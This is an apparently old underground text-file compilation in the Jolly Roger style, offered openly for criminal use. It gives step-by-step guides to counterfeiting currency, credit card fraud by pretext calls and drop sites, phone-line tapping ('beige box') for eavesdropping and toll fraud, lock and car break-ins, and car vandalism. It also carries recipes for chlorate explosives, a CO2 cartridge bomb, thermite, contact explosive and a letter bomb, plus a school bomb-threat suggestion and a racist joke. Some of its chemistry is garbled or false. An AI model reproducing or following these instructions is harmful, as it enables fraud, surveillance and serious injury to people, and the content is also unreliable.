Counterfeiting Money                            by JRoger

Before reading this article, it would be a very good idea to get a 
book on photo offset printing, for this is the method used in
counterfeiting US currency.  If you are familiar with this method 
of printing, counterfeiting should be a simple task for you.

Genuine currency is made by a process called "gravure", which 
involves etching a metal block.  Since etching a metal block is
impossible to do by hand, photo offset printing comes into the 
process.

Photo offset printing starts by making negatives of the currency
with a camera, and putting the negatives on a piece of masking 
material (usually orange in color).  The stripped negatives, 
commonly called "flats", are then exposed to a lithographic plate
with an arc light plate maker.  The burned plates are then 
developed with the proper developing chemical.  One at a time, 
these plates are wrapped around the plate cylinder of the press.   

The press to use should be an 11 by 14 offset, such as the AB Dick 
360.  Make 2 negatives of the portrait side of the bill, and 1 of 
the back side.  After developing them and letting them dry, take 
them to a light table.  Using opaque on one of the portrait sides, 
touch out all the green, which is the seal and the serial numbers.  
The back side does not require any retouching, because it is all 
one color.  Now, make sure all of the negatives are registered 
(lined up correctly) on the flats.  By the way, every time you 
need another serial number, shoot 1 negative of the portrait side,
cut out the serial number, and remove the old serial number from 
the flat replacing it with the new one.

Now you have all 3 flats, and each represents a different color:  
black, and 2 shades of green (the two shades of green are created 
by mixing inks).  Now you are ready to burn the plates.  Take a 
lithographic plate and etch three marks on it.  These marks must 
be 2 and 9/16 inches apart, starting on one of the short edges.  
Do the same thing to 2 more plates.  Then, take 1 of the flats and 
place it on the plate, exactly lining the short edge up with the 
edge of the plate.  Burn it, move it up to the next mark, and 
cover up the exposed area you have already burned.  Burn that, and 
do the same thing 2 more times, moving the flat up one more mark.  
Do the same process with the other 2 flats (each on a separate 
plate).  Develop all three plates.  You should now have 4 images 
on each plate with an equal space between each bill. 

The paper you will need will not match exactly, but it will do for 
most situations.  The paper to use should have a 25% rag content.
By the way, Disaperf computer paper (invisible perforation) does 
the job well.  Take the paper and load it into the press.  Be sure 
to set the air, buckle, and paper thickness right.  Start with the 
black plate (the plate without the serial numbers).  Wrap it 
around the cylinder and load black ink in.  Make sure you run more 
than you need because there will be a lot of rejects.  Then, while 
that is printing, mix the inks for the serial numbers and the back 
side.  You will need to add some white and maybe yellow to the 
serial number ink.  You also need to add black to the back side.  
Experiment until you get it right.  Now, clean the press and print 
the other side.  You will now have a bill with no green seal or 
serial numbers.  Print a few with one serial number, make another 
and repeat.  Keep doing this until you have as many different 
numbers as you want.  Then cut the bills to the exact size with a 
paper cutter.  You should have printed a large amount of money by 
now, but there is still one problem;  the paper is pure white.  To 
dye it, mix the following in a pan:  2 cups of hot water, 4 tea 
bags, and about 16 to 20 drops of green food coloring (experiment 
with this).  Dip one of the bills in and compare it to a genuine 
US bill.  Make the necessary adjustments, and dye all the bills.  
Also, it is a good idea to make them look used.  For example, 
wrinkle them, rub coffee grinds on them, etc.

As before mentioned, unless you are familiar with photo offset 
printing, most of the information in this article will be fairly 
hard to understand.  Along with getting a book on photo offset 
printing, try to see the movie "To Live and Die in LA".  It is 
about a counterfeiter, and the producer does a pretty good job of 
showing how to counterfeit.  A good book on the subject is "The 
Poor Man's James Bond".

If all of this seems too complicated to you, there is one other 
method available for counterfeiting:  The Canon color laser 
copier.  The Canon can replicate ANYTHING in vibrant color, 
including US currency.  But, once again, the main problem in 
counterfeiting is the paper used.  So, experiment, and good luck!

Credit Card Fraud:                
-----------------

For most of you out there, money is hard to come by.  Until now:

With the recent advent of plastic money (credit cards), it is 
easy to use someone else's credit card to order the items you have 
always desired in life.  The stakes are high, but the payoff is 
worth it.

Step One:  Getting the credit card information

First off, you must obtain the crucial item:  someone's credit 
card number.  The best way to get credit card numbers is to take 
the blue carbons used in a credit card transaction at your local 
department store.  These can usually be found in the garbage can 
next to the register, or for the more daring, in the garbage 
dumpster behind the store.  But, due to the large amount of credit 
card fraud, many stores have opted to use a carbonless transaction 
sheet, making things much more difficult.  This is where your 
phone comes in handy.

First, look up someone in the phone book, and obtain as much 
information as possible about them.  Then, during business hours, 
call in a very convincing voice - "Hello, this is John Doe from 
the Visa Credit Card Fraud Investigations Department.  We have 
been informed that your credit card may have been used for 
fraudulent purposes, so will you please read off the numbers 
appearing on your Visa card for verification."  Of course, use 
your imagination!  Believe it or not, many people will fall for 
this ploy and give out their credit information.

Now, assuming that you have your victim's credit card number, you 
should be able to decipher the information given.

Step Two:  Recognizing information from carbon copies

Card examples:

[American Express]
XXXX XXXXXX XXXXX
MM/Y1 THRU MM/Y2
JOE SHMOE

[American Express]
XXXX XXXXXX XXXXX
MM/Y1 THRU MM/Y2
JOE SHMOE

Explanation:
   MM/Y1 is the date the card was issued, and MM/Y2 is the
   expiration date.  The American Express Gold Card has numbers
   XXXXXX XXXXXXXX XXXXXXXX, and is covered for up to $5000.00, 
   even if the card holder is broke. 
   
[Mastercard]
5XXX XXXX XXXX XXXX
XXXX AAA DD-MM-YY MM/YY
JOE SHMOE

Explanation:
   XXXX in the second row may be asked for during the ordering
   process.  The first date is when the card was new, and the 
   second is when the card expires.  The most frequent number 
   combination used is 5424 1800 XXXX XXXX.  There are many of 
   these cards in circulation, but many of these are on wanted
   lists, so check these first.

[Visa]
4XXX XXX(X) XXX(X) XXX(X)
MM/YY    MM/YY*VISA
JOE SHMOE

Explanation:
   Visa is the most abundant card, and is accepted almost 
   everywhere.  The "*VISA" is sometimes replaced with "BWG", or
   followed with a special code.  These codes are as follows:

   [1]  MM/YY*VISA V - Preferred Card
   [2]  MM/YY*VISA CV - Classic Card
   [3]  MM/YY*VISA PV - Premier Card
   
   Preferred Cards are backed with money, and are much safer to 
   use.  Classic Cards are newer, harder to reproduce cards with
   decent backing.  Premier Cards are Classic Cards with Preferred
   coverage.  Common numbers are 4448 020 XXX XXX, 4254 5123 6000
   XXXX, and 4254 5123 8500 XXXX.  Any 4712 1250 XXXX XXXX cards
   are IBM Credit Union cards, and are risky to use, although 
   they are usually covered for large purchases.

Step Three:  Testing credit

You should now have a Visa, Mastercard, or American Express 
credit card number, with the victim's address, zip code, and phone 
number.  By the way, if you have problems getting the address, 
most phone companies offer the Address Tracking Service, which is 
a special number you call that will give you an address from a 
phone number, at a nominal charge.  Now you need to check the 
balance of credit on the credit card (to make sure you don't run 
out of money), and you must also make sure that the card isn't 
stolen.  To do this you must obtain a phone number that 
businesses use to check out credit cards during purchases.  If you 
go to a department store, watch the cashier when someone makes a 
credit card purchase.  He/she will usually call a phone number, 
give the credit information, and then give what is called a 
"Merchant Number".  These numbers are usually written down on or 
around the register.  It is easy to either find these numbers and 
copy them, or to wait until they call one in.  Watch what they 
dial and wait for the 8 digit (usually) merchant number.  Once you 
call the number, in a calm voice, read off the account number, 
merchant number, amount, and expiration date.  The credit bureau 
will tell you if it is ok, and will give you an authorization 
number.  Pretend you are writing this number down, and repeat it 
back to them to check it.  Ignore this number completely, for it 
serves no real purpose.  However, once you do this, the bank 
removes dollars equal to what you told them, because the card was 
supposedly used to make a purchase.  Sometimes you can trick the
operator by telling her the customer changed his mind and decided 
not to charge it.  Of course, some will not allow this.  Remember
at all times that you are supposed to be a store clerk calling to 
check out the card for a purchase.  Act like you are talking with 
a customer when he/she "cancels".

Step Four:  The drop

Once the cards are cleared, you must find a place to have the 
package sent.  NEVER use a drop more than once.  The following are 
typical drop sites:

   [1]  An empty house
        
An empty house makes an excellent place to send things.  Send the 
package UPS, and leave a note on the door saying, "UPS.  I work 
days, 8 to 6.  Could you please leave the package on the back door 
step?"  You can find dozens of houses from a real estate agent by 
telling them you want to look around for a house.  Ask for a list 
of twenty houses for sale, and tell them you will check out the 
area.  Do so, until you find one that suits your needs.

   [2]  Rent A Spot

U-Haul sometimes rents spaces where you can have packages sent and 
signed for.  End your space when the package arrives.

   [3]  People's houses

Find someone you do not know, and have the package sent there.  
Call ahead saying that "I called the store and they sent the 
package to the wrong address.  It was already sent, but can you 
keep it there for me?"  This is a very reliable way if you keep
calm when talking to the people.

Do NOT try post office boxes.  Most of the time, UPS will not 
deliver to a post office box, and many people have been caught in 
the past attempting to use a post office box.  Also, when you have 
determined a drop site, keep an eye on it for suspicious 
characters and cars that have not been there before.

Step Five:  Making the transaction

You should now have a reliable credit card number with all the 
necessary billing information, and a good drop site.

The best place to order from is catalogues, and mail order houses.  
It is in your best interest to place the phone call from a pay 
phone, especially if it is a 1-800 number.  Now, when you call, 
don't try to disguise your voice, thinking you will trick the 
salesperson into believing you are an adult.  These folks are 
trained to detect this, so your best bet is to order in your own 
voice.  They will ask for the following:  name, name as it appears 
on card, phone number, billing address, expiration date, method of 
shipping, and product.  Ask if they offer UPS Red shipping (next 
day arrival), because it gives them less time to research an 
order.  If you are using American Express, you might have a bit of 
a problem shipping to an address other than the billing address.  
Also, if the salesperson starts to ask questions, do NOT hang up.  
Simply talk your way out of the situation, so you won't encourage
investigation on the order.

If everything goes right, you should have the product, free of 
charge.  Insurance picks up the tab, and no one is any wiser.  Be 
careful, and try not to order anything over $500.  In some states, 
UPS requires a signature for anything over $200, not to mention 
that anything over $200 is defined as grand theft, as well as 
credit fraud.  Get caught doing this, and you will bite it for a 
couple of years.  Good luck!

Potassium chlorate is an extremely volatile explosive compound, 
and has been used in the past as the main explosive filler in 
grenades, land mines, and mortar rounds by such countries as 
France and Germany.  Common household bleach contains a small 
amount of potassium chlorate, which can be extracted by the 
procedure that follows.

First off, you must obtain:

[1]  A heat source (hot plate, stove, etc.)
[2]  A hydrometer, or battery hydrometer
[3]  A large Pyrex, or enameled steel container (to weigh 
     chemicals)
[4]  Potassium chloride (sold as a salt substitute at health and 
     nutrition stores)

Take one gallon of bleach, place it in the container, and begin 
heating it.  While this solution heats, weigh out 63 grams of 
potassium chloride and add this to the bleach being heated.  
Constantly check the solution being heated with the hydrometer, 
and boil until you get a reading of 1.3.  If using a battery 
hydrometer, boil until you read a FULL charge.

Take the solution and allow it to cool in a refrigerator until it 
is between room temperature and 0 degrees Celcius.  Filter out the 
crystals that have formed and save them.  Boil this solution again 
and cool as before.  Filter and save the crystals.

Take the crystals that have been saved, and mix them with 
distilled water in the following proportions:  56 grams per 100 
milliliters distilled water.  Heat this solution until it boils 
and allow to cool.  Filter the solution and save the crystals that 
form upon cooling.  This process of purification is called 
"fractional crystalization".  These crystals should be relatively 
pure potassium chlorate.

Powder these to the consistency of face powder, and heat gently to 
drive off all moisture.

Now, melt five parts Vaseline with five parts wax.  Dissolve this 
in white gasoline (camp stove gasoline), and pour this liquid on 
90 parts potassium chlorate (the powdered crystals from above) 
into a plastic bowl.  Knead this liquid into the potassium 
chlorate until intimately mixed.  Allow all gasoline to evaporate.

Finally, place this explosive into a cool, dry place.  Avoid 
friction, sulfur, sulfides, and phosphorous compounds.  This 
explosive is best molded to the desired shape and density of 1.3 
grams in a cube and dipped in wax until water proof.  These block 
type charges guarantee the highest detonation velocity.  Also, a 
blasting cap of at least a 3 grade must be used.

The presence of the afore mentioned compounds (sulfur, sulfides, 
etc.) results in mixtures that are or can become highly sensitive 
and will possibly decompose explosively while in storage.  You 
should never store homemade explosives, and you must use EXTREME 
caution at all times while performing the processes in this 
article.

Have you ever tried to impress someone by picking one of those 
Master combination locks and failed?

The Master lock company made their older combination locks with a 
protection scheme.  If you pull the handle too hard, the knob will 
not turn.  That was their biggest mistake.

The first number:

Get out any of the Master locks so you know what is going on.  
While pulling on the clasp (part that springs open when you get 
the combination right), turn the knob to the left until it will 
not move any more, and add five to the number you reach.  You now 
have the first number of the combination.

The second number:

Spin the dial around a couple of times, then go to the first 
number you got.  Turn the dial to the right, bypassing the first 
number once.  When you have bypassed the first number, start 
pulling on the clasp and turning the knob.  The knob will 
eventually fall into the groove and lock.  While in the groove, 
pull the clasp and turn the knob.  If the knob is loose, go to the 
next groove, if the knob is stiff, you have the second number of 
the combination.

The third number:

After getting the second number, spin the dial, then enter the two 
numbers.  Slowly spin the dial to the right, and at each number, 
pull on the clasp.  The lock will eventually open if you did the 
process right.  

This method of opening Master locks only works on older models.  
Someone informed Master of their mistake, and they employed a new 
mechanism that is foolproof (for now).

The older models are from 1988-1990.  The newer models are being
cracked on as we speak..

The Arts of Lockpicking I              courtesy of The Jolly Roger

Lockpicking I:  Cars and assorted other locks

While the basic themes of lockpicking and uninvited entry have not 
changed much in the last few years, some modern devices and 
techniques have appeared on the scene.

Automobiles:

Many older automobiles can still be opened with a Slim Jim type of 
opener (these and other auto locksmithing techniques are covered 
fully in the book "In the Still of the Night", by John Russell    
III);  however, many car manufacturers have built cases over the 
lock mechanism, or have moved the lock mechanism so the Slim Jim 
will not work.  So:

American Locksmith Service
P.O. Box 26
Culver City, CA  90230

ALS offers a new and improved Slim Jim that is 30 inches long and
3/4 inches wide, so it will both reach and slip through the new 
car lock covers (inside the door).  Price is $5.75 plus $2.00 
postage and handling.

Cars manufactured by General Motors have always been a bane to 
people who needed to open them, because the sidebar locking unit 
they employ is very difficult to pick.  To further complicate 
matters, the new GM cars employ metal shields to make the use of a
Slim Jim type instrument very difficult.  So:

Lock Technology Corporation
685 Main St.
New Rochelle, NY  10801

LTC offers a cute little tool which will easily remove the lock 
cylinder without harm to the vehicle, and will allow you to enter 
and/or start the vehicle.  The GMC-40 sells for $56.00 plus $2.00 
for postage and handling.

The best general automobile opening kit is probably a set of 
lockout tools offered by:

Steck MFG Corporation
1319 W. Stewart St.
Dayton, OH  45408

For $29.95 one can purchase a complete set of six carbon lockout
tools that will open more than 95% of all the cars around.

Kwickset locks have become quite popular as one step security 
locks for many types of buildings.  They are a bit harder to pick 
and offer a higher degree of security than a normal builder 
installed door lock.  So:

A MFG
1151 Wallace St.
Massilon, OH  44646

Price is $11.95.  Kwickset locks can handily be disassembled and 
the door opened without harm to either the lock or the door by 
using the above mentioned Kwick Out tool.

If you are too lazy to pick auto locks:

Veehof Supply
Box 361
Storm Lake, IO  50588

VS sells tryout keys for most cars (tryout keys are used since 
there is no one master key for any one make of car, but there are 
group type masters (a.k.a. tryout keys).  Prices average about 
$20.00 a set.

Updated Lockpicking:

For years, there have been a number of pick attack procedures for 
most pin and tumbler lock systems.  In reverse order of ease they 
are as follows:

Normal Picking:  Using a pick set to align the pins, one by one, 
                 until the shear line is set and the lock opens.

Racking:  This method uses picks that are constructed with a 
          series of bumps, or diamond shape notches.  These picks
          are "raked" (i.e. run over all the pins at one time).  
          With luck, the pins will raise in the open position and
          stay there.  Raking, if successful, can be much less of
          an effort than standard picking.

Lock Aid Gun:  This gun shaped device was invented a number of 
               years ago and has found application with many 
               locksmiths and security personnel.  Basically, a 
               needle shaped pick is inserted in the snout of the
               "gun", and the "trigger" is pulled.  This action 
               snaps the pick up and down strongly.  If the tip is
               slipped under the pins, they will also be snapped 
               up and down strongly.  With a bit of luck they will
               strike each other and separate at the shear line 
               for a split second.  When this happens the lock 
               will open.  The lock aid gun is not 100% 
               successful, but when it does work, the results are 
               very dramatic.  You can sometimes open the lock 
               with one snap of the trigger.

Vibrator:  Some crafty people have mounted a needle pick into an 
           electric toothbrush power unit.  This vibrating effect
           will sometimes open pin tumbler locks -- instantly.

There is now another method to open pin and wafer locks in a very
short time.  Although it resembles a toothbrush pick in 
appearance, it is actually an electronic device.  I am speaking of
the Cobra pick that is designed and sold by:

Fed Corporation
P.O. Box 569
Scottsdale, AR  85252

The Cobra uses two nine volt batteries, teflon bearings (for less
noise), and a cam roller.  It comes with three picks (for 
different types of locks) and works both in America and overseas,
on pin or wafer locks.  The Cobra will open group one locks 
(common door locks) in three to seven seconds with no damage, in 
the hands of an experienced locksmith.  It can take a few seconds
more or up to a half a minute for someone with no experience at 
all.  It will also open group two locks (including government, 
high security, and medecos), although this can take a short time 
longer.  It will not open GM sidear locks, although a device is
about to be introduced to fill that gap.  How much for this toy 
that will open most locks in seven seconds?

$235.00 plus $4.00 shipping and handling.

For you hard core safe crackers, FC also sells the MI-6 that will 
open most safes at a cost of $10,000 for the three wheel attack 
model, and $10,500 for the four wheel model.  It comes in a sturdy
aluminum carrying case with monitor, disk drive and software.

If none of these safe and sane ideas appeal to you, you can always
fall back on the magic thermal lance...

The thermal lance is a rather crude instrument constructed from 
3/8 inch hollow magnesium rods.  Each tube comes in a 10 foot 
length, but can be cut down if desired.  Each one is threaded on 
one end.  To use the lance, you screw the tube together with a 
matted regulator (like a welding outfit uses) and hook up an 
oxygen tank.  Then oxygen is turned on and the rod is lit with a 
standard welding ignitor.  The device produces an incredible 
amount of heat.  It is used for cutting up concrete blocks or even
rocks.  An active lance will go through a foot of steel in a few 
seconds.  The lance is also known as a burning bar, and is 
available from:

So you want to be a criminal.  Well, if you want to be like James 
Bond and open a lock in fifteen seconds, then go to Hollywood, 
because that is the only place you are ever going to do it.  Even 
experienced locksmiths can spend five to ten minutes on a lock if
they are unlucky.  If you are wanting extremely quick access, look
elsewhere.  The following instructions will pertain mostly to the
"lock in knob" type lock, since it is the easiest to pick.

First of all, you need a pick set.  If you know a locksmith, get 
him to make you a set.  This will be the best possible set for you
to use.  If you find a locksmith unwilling to supply a set, don't 
give up hope.  It is possible to make your own, if you have access
to a grinder (you can use a file, but it takes forever).

The thing you need is an allen wrench set (very small).  These 
should be small enough to fit into the keyhole slot.  Now, bend 
the long end of the allen wrench at a slight angle (not 90  
degrees).  Now, take your pick to a grinder or a file, and smooth 
the end until it is rounded so it won't hang inside the lock.  
Test your tool out on doorknobs at your house to see if it will 
slide in and out smoothly.  Now, this is where the screwdriver 
comes in.  It must be small enough for it and your pick to be used
in the same lock at the same time, one above the other.  In the 
coming instructions, please refer to this chart of the interior of
a lock:
______________________________
                              \ K
        |  |  |  |   |   |    / E
           |     |   |   |    \ Y           [|]  Upper tumbler pin
        ^     ^               / H           [^]  Lower tumbler pin
        ^  ^  ^  ^   ^   ^    \ O           [-]  Cylinder wall
                              / L   (This is a greatly simplified
                              \ E    drawing, and I left it that way 4.50)
______________________________/

The object is to press the pin up so that the space between the 
upper pin and the lower pin is level with the cylinder wall.  Now,
if you push a pin up, it's tendency is to fall back down, right?
That is where the screwdriver comes in.  Insert the screwdriver 
into the slot and turn.  This tension will keep the "solved" pins
from falling back down.  Now, work from the back of the lock to 
the front, and when you are through, there will be a click, the
screwdriver will turn freely, and the door will open.

Do not get discouraged on your first try!  It will probably take 
you about twenty to thirty minutes your first time.  After that,
you will quickly improve with practice.

Most people are not aware that a volatile, extremely explosive 
chemical can be bought over the counter:  Solidox.

Solidox comes in an aluminum can containing 6 grey sticks, and can 
be bought at Kmart, and various hardware supply shops for around 
$7.00.  Solidox is used in welding applications as an oxidizing 
agent for the hot flame needed to melt metal.  The most active 
ingredient in Solidox is potassium chlorate, a filler used in many 
military applications in the WWII era.

Since Solidox is literally what the name says:  SOLID OXygen, you 
must have an energy source for an explosion.  The most common and 
readily available energy source is common household sugar, or 
sucrose.  In theory, glucose would be the purest energy source, 
but it is hard to find a solid supply of glucose.

Making the mixture:

[1]  Open the can of Solidox, and remove all 6 sticks.  One by 
     one, grind up each of the sticks (preferably with a mortar 
     and pestle) into the finest powder possible.
[2]  The ratio for mixing the sugar with the Solidox is 1:1, so 
     weigh the Solidox powder, and grind up the equivalent amount 
     of sugar.
[3]  Mix equivalent amounts of Solidox powder, and sugar in a 1:1 
     ratio.

It is just that simple!  You now have an extremely powerful 
substance that can be used in a variety of applications.  A word 
of caution:  be EXTREMELY careful in the entire process.  Avoid 
friction, heat, and flame.  A few years back, a teenager I knew 
blew 4 fingers off while trying to make a pipe bomb with Solidox.  
You have been warned!


SolidOx can no longer be bought in KMart.  A plumbing and heating supply
store, or even Sears may have small quantities for sale, at about
$18.00 for 10 stix.

High Tech Revenge: The Beigebox  rev. 4.50          by Mondain
   
             -------------Introduction-------------
Have you ever wanted a lineman's handset? Surely every phreak has at
least once considered the phun that he could have with one. After searching
unlocked phone company trucks for months, we had an idea. We could build
one. We did, and named it the "Beige Box" simply because that is the color
of ours. 
The beigebox is simply a consumer lineman's handset, which is a 
phone that can be attached to the outside of a person's house.  To 
fabricate a beigebox, follow along.

             ---------Construction and Use---------
The construction is very simple. First you must understand the concept of
the device. In a modular jack, there are four wires. These are red, green,
yellow, and black. For a single line telephone, however, only two matter:
the red (ring) and green (tip). The yellow and the black are not neccessary
for this project. A lineman's handset has two clips on it: the ring and
the tip. Take a modular jack and look at the bottom of it's casing. There
should be a grey jack with four wires  (red, green, yellow & black)
leading out of it. To the end of the red wire attach a red aligator clip.
To the end of the green wire attatch a green aligator clip. The yellow
and black wires can be removed, although I would only set them aside so
that you can use the modular jack in future projects. Now insert your
telephone's modular plug into the modular jack. That's it. This particular
model is nice because it is can be easily made, is inexpensive, uses
common parts that are readily available, is small, is lightweight,
and does not require the destruction of a phone.

             ------------Beige Box Uses------------
There are many uses for a Beige Box. However, before you can use it,
you must know how to attach it to the output device. This device can be
of any of Bell switching apparatus that include germinal sets (i.e.
remote switching centers, bridgin heads, cans, etc.). To open most Bell
Telephone switching apparatus, you must have a 7/16 inch hex driver
(or a good pair of needle nose pliers work also).
This piece of equipment can be picked up at your local hardware store.
With your hex driver (or pliers), turn the security bolt(s) approximately
1/8 of an inch counter-clockwise and open. If your output device is locked,
then you must have some knowledge of destroying and/or picking locks.
However, we have never encountered a locked output device. Once you have
opened your output device, you should see a mass of wires connected to
terminals. On most output devices, the terminals should be labeled "T"
(Tip -- if not labeled, it is usually on the left) and "R" (Ring -- if
not labeled, usually on the right).

Remember: Ring - red - right. The "Three R's" -- a simple way to
remember which is which. Now you must attach all the red alligator clip
(Ring) to the "R" (Ring) terminal.
Attach the green alligator clip (Tip) to the "T" (Tip) terminal.

Note: If instead of a dial tone you hear nothing, adjust the alligator
clips so that they are not touching each other terminals. Also make sure
they are firmly attached. By this time you should hear a dial tone.
Dial ANI to find out the number you are using (you wouldn't want to use
your own). Here are some practicle aplications:

       > Eavesdropping
       > Long distance, static free free fone calls to phriends
       > Dialing direct to Alliance Teleconferencing (also no static)
       > Phucking people over
       > Bothering the operator at little risk to yourself
       > Blue Boxing with greatly reduced chance of getting caught
       > Anything at all you want, since you are on an extension of that line.

Eavesdropping
-------------
To be most effective, first attach the Beige Box then your phone. This
eliminates the static caused by connecting the box, therefore
reducing the potential suspicion of your victim. When eavesdropping,
it is allways best to be neither seen nor heard. If you hear someone
dialing out, do not panic; but rather hang up, wait, and pick up the
receiver again. The person will either have hung up or tried to complete
their call again. If the latter is true, then listen in, and perhaps you
will find information worthy of blackmail! If you would like to know who
you are listening to, after dialing ANI, pull a CN/A on the number.

Dialing Long Distance
---------------------
This section is self explanitory, but don't forget to dial a "1" before
the NPA.

Dialing Direct to Aliance Teleconferencing
------------------------------------------
Simply dial 0-700-456-1000 and you will get instructions from there.
I prefer this method over PBX's, since PBX's often have poor reception
and are more dificult to come by.

Phucking People Over
--------------------
This is a very large topic of discussion. Just by using the other topics
described, you can create a large phone bill for the person (they will
not have to pay for it, but it will be a big hassle for them). In addition,
since you are an extension of the person's line, you can leave your
phone off the hook, and they will not be able to make or receive calls.
This can be extremely nasty because no one would expect the cause
of the problem. 
Bothering the Operator
----------------------
This is also self explanitary and can provide hours of entertainment.
Simply ask her things that are offensive or you would not like traced
to your line. This also corresponds to the previously described section,
Phucking People Over. After all, guess who's line it gets traced to?
He he he...

Blue Boxing
-----------
See a file on Blue Boxing for more details. This is an especially nice
feature if you live in an ESS-equiped prefix, since the calls are, once
again, not traced to your line...

---POTENTIAL RISKS OF BEIGE BOXING----
Overuse of the Beige Box may cause suspicians within the Gestapo,
and result in legal problems. Therefor, I would recomend you:

            > Choose a secluded spot to do your Beige Boxing,
            > Use more than one output device
            > Keep a low profile (i.e., do not post under your real
              name on a public BBS concering your occomplishments)
            > In order to make sure the enemy has not been inside your output
              device, I recomend you place a piece of transparent tape over
              the opening of your output device. Therefor, if it is
              opened in your abscence, the tapqe will be displaced and
              you will be aware of the fact that someone has intruded
              on your teritory.

Now, imagine the possibilities:  a $2000 dollar phone bill for 
that special person, 976 numbers galore, even harassing the 
operator at no risk to you!  Think of it as walking into an 
enemies house, and using their phone to your heart's content.

               How to make a CO2 bomb        by the Jolly Roger

You will have to use up the cartridge first by either shooting it 
or whatever. With a nail, force a hole bigger so as to allow the 
powder and wick to fit in easily. Fill the cartridge with black 
powder and pack it in there real good by tapping the bottom of the 
cartridge on a hard surface (I said TAP not SLAM!). Insert a fuse. 
I recommend a good water-proof cannon fuse, or an m-80 type fuse, 
but firecracker fuses work, if you can run like a black man runs 
from the cops after raping a white girl.) Now, light it and run 
like hell! It does wonders for a row of mailboxes (like the ones 
in apartment complexes), a car (place under the gas tank), a 
picture window (place on window sill), a phone booth (place right 
under the phone), or any other devious place. This thing throws 
shrapnel, and can make quit a mess!!  -Jolly Roger-



Thermite II... or A better way to make Thermite        by Jolly Roger

Thermite is nasty shit. Here is a good and easy way to make it. 
The first step is to get some iron-oxide (which is RUST!). Here is 
a good way to make large quantities in a short time:

- Get a DC convertor like the one used on a train set. Cut the 
connector off, seperate the wires, and strip them both.

- Now you need a jar of water with a tablespoon or so of sodium 
chloride (which is SALT!) added to it. This makes the water 
conductive.

- Now insert both wires into the mixture (I am assuming you 
plugged the convertor in...) and let them sit for five minutes. 
One of them will start bubbling more than the other. This is the 
POSITIVE(+) wire. If you do not do this test right, the final 
product will be the opposite (chemically) of rust, which is RUST 
ACID. You have no use for this here (although it IS useful!).

- Anyway, put the nail tied to the positive wire into the jar. Now 
put the negative wire in the other end. Now let it sit overnight 
and in the morning scrape the rust off of the nail & repeat until 
you got a bunch of rust on the bottom of the glass. Be generous 
with your rust collection. If you are going through the trouble of 
making thermite, you might as well make a lot, right?

- Now remove the excess water and pour the crusty solution onto a 
cookie sheet. Dry it in the sun for a few hours, or inside 
overnight. It should be an orange-brown color (although I have 
seen it in many different colors! Sometimes the color gets fucked 
up, what can I say... but it is still iron oxide!)

- Crush the rust into a fine powder and heat it in a cast-iron pot 
until it is red. Now mix the pure iron oxide with pure alluminum 
filinos which can be bought or filed down by hand from an aluminum 
tube or bar. The ratio or iron oxide to aluminum is 8 grams to 3 
grams.

- Congrats! You have just made THERMITE! Now, to light it...

- Thermite requires a LOT of heat (more than a blow torch!) to 
ignite. However, a magnesium ribbon (which is sorta hard to find.. 
call around) will do the trick.  It takes the heat from the 
burning magnesium to light the thermite.

- Now when you see your victim's car, pour a fifty-cent sized pile 
onto his hood, stick the ribbon in it, and light the ribbon with 
the blow torch. Now chuckle as you watch it burn through the hood, 
the block, the axle, and the pavement. BE CAREFUL! The ideal 
mixtures can vaporize CARBON STEEL! Another idea is to use 
thermite to get into pay phone cash boxes. HAVE FUN!!

Touch Explosives                         by the Jolly Roger

This is sort of a mild explosive, but it can be quite dangerous in 
large quantities. To make touch explosive (such as that found in a 
snap-n-pop, but more powerful), use this recipe:

- Mix iodine crystals into ammonia until the iodine crystals will 
not dissolve into the ammonia anymore. Pour off the excess ammonia 
and dry out the crystals on a baking sheet the same way as you 
dried the thermite (in other words, just let it sit overnight!).

- Be careful now because these crystals are now your touch 
explosive. Carefully wrap a bunch in paper (I mean carefully! 
Friction sets 'em off!) and throw them around.. pretty loud, huh?
They are fun to put on someone's chair. Add a small fish sinker to 
them and they can be thrown a long distance (good for crowds, 
football games, concerts, etc.) Have fun!  -Jolly Roger-



Letter Bombs                            by The Jolly Roger

- You will first have to make a mild version of thermite. Use my 
recipe, but substitute iron fillings for rust. 

- Mix the iron with aluminum fillings in a ratio of 75% aluminum 
to 25% iron. This mixture will burn violently in a closed space 
(such as an envelope). This bring us to our next ingredient...

- Go to the post office and buy an insulated (padded) envelope. 
You know, the type that is double layered... Seperate the layers 
and place the mild thermite in the main section, where the letter 
would go. Then place magnesium powder in the outer layer. There is 
your bomb!!

- Now to light it... this is the tricky part and hard to explain. 
Just keep experimenting until you get something that works. The 
fuse is just that touch explosive I have told you about in another 
one of my anarchy files. You might want to wrap it like a long 
cigarette and then place it at the top of the envelope in the 
outer layer (on top of the powdered magnesium). When the touch 
explosive is torn or even squeezed hard it will ignite the 
powdered magnesium (sort of a flash light) and then it will burn 
the mild thermite. If the thermite didn't blow up, it would at 
least burn the fuck out of your enemy (it does wonders on human 
flesh!). 

NOW that is REVENGE!                 -Jolly Roger-



Ways to send a car to Hell            by The Jolly Roger

There are 1001 ways to destroy a car but I am going to cover only
the ones that are the most fun (for you), the most destructive
(for them), and the hardest to trace (for the cops).

- Place thermite on the hood, light it, and watch it burn all the
way through the pavement!

- Tape a CO2 bomb to the hood, axel, gas tank, wheel, muffler,
etc.)

- Put a tampon, dirt, sugar (this one is good!), a ping pong ball,
or just about anything that will dissolve in the gas tank.
Plastic deforms and dilutes into gas.  The final result is much
harder to inject into the engine, possibly causing valve replacement.


- Put potatoes, rocks, banannas, or anything that will fit, into
the tailpipe. Use a broom handle to stuff 'em up into the
tailpipe.

- Put a long rag into the gas tank and light it...

- Steal a key, copy it, replace it, and then steal the stereo.

- Break into the car. Cut a thin metal ruler into a shape like
this:
                    (Revised ill. 4.50)
               
               
               
               
              
              
             

Slide it into the outside window and keep pulling it back up until
you catch the lock cable which should unlock the door. This device
is also called a SLIM JIM. Now get the stereo, equalizer, radar
detector, etc. Now destroy the inside. (A sharp knife does wonders
on the seats!)

Do ya hate school?                  by The Jolly Roger

- One of my favorites for getting out of a class or two is to call 
in a bomb threat. Tell 'em that it is in a locker. Then they have 
to check them all, whilst you can slip away for an hour or two. 
You can even place a fake bomb (in any locker but YOURS!). They 
might cancel school for a week while they investigate (of course, 
you will probably have to make it up in the summer...).
 
- Get some pure potassium or pure sodium, put it in a capsule, and 
flush it down the toilet (smells awful! Stinks up the whole school!).

- Use a smoke grenade in the hallway.

- Steal the computer passwords & keys. Or steal the 80 column cards
 inside if they are (gag) IBM.

- Make friends with student assistants and have them change your
grades when the teachers hand in their bubble sheets for the report
cards.
 
- Spit your gum out on the carpet in the library or whatever and 
grind it into the carpet. Watch the janitors cry!

